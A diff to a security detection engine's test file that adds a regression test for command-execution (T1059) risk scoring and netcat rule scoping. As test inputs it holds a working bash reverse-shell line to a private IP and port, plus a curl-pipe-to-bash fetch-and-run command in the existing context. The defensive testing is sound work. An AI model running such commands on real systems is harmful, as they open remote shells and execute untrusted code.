@@ -205,3 +205,19 @@ def test_curl_pipe_bash_still_matches_after_nc_exec_addition():
     disturb the original shell+network-tool matching path."""
     c = _t1059(YAMLDetectionEngine(), _shell_event("curl http://x/s.sh | bash"))
     assert c is not None and c.matched is True
+
+
+def test_dev_tcp_does_not_double_count_netcat_adjustment(engine):
+    """Regression guard: `/bin/bash -c bash -i >&/dev/tcp/...` contains the
+    literal substring "-c bash" (from "bash -c bash -i"), which without a
+    process.name gate on the netcat risk_adjustment would incorrectly also
+    fire the "Netcat-family" reason and double-count the score on a bash-only
+    event that never touched nc/ncat. Caught live: this exact event scored
+    97 instead of 82 before the risk_adjustment was scoped to
+    process.name in [nc, ncat, netcat]."""
+    c = _t1059(engine, _shell_event(
+        '/bin/bash -c bash -i >& /dev/tcp/192.168.88.157/4444 0>&1'
+    ))
+    assert c is not None and c.matched is True
+    assert c.risk_score == 82, f"expected no netcat double-count, got {c.risk_score}"
+    assert not any("Netcat-family" in r for r in c.adjustment_reasons)
